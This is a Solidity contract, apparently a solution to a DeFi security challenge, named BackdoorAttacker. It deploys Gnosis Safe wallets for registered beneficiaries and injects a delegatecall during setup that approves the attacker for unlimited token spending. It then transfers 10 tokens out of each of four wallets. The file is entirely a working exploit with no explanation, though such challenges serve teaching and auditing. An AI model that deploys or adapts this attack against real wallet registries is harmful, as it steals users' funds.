// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract BackdoorAttacker {
    IERC20 private immutable token;

    constructor(address _tokenAddress) {
        token = IERC20(_tokenAddress);
    }

    function attack(
        address _walletFactoryAddress,
        address _masterCopyAddress,
        address _walletRegistryAddress,
        address[] calldata _owners
    ) external {
        for (uint256 i = 0; i < 4; i++) {
            address[] memory owners = new address[](1);
            owners[0] = _owners[i];
            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners,
                1,
                address(this),
                abi.encodeWithSelector(BackdoorAttacker.approve.selector, address(this)),
                address(0x0),
                address(0x0),
                0,
                address(0x0)
            );

            GnosisSafeProxy proxy = GnosisSafeProxyFactory(_walletFactoryAddress).createProxyWithCallback(
                _masterCopyAddress,
                initializer,
                i,
                IProxyCreationCallback(_walletRegistryAddress)
            );

            token.transferFrom(address(proxy), msg.sender, 10 ether);
        }
    }

    function approve(address spender) external {
        token.approve(spender, type(uint256).max);
    }
}
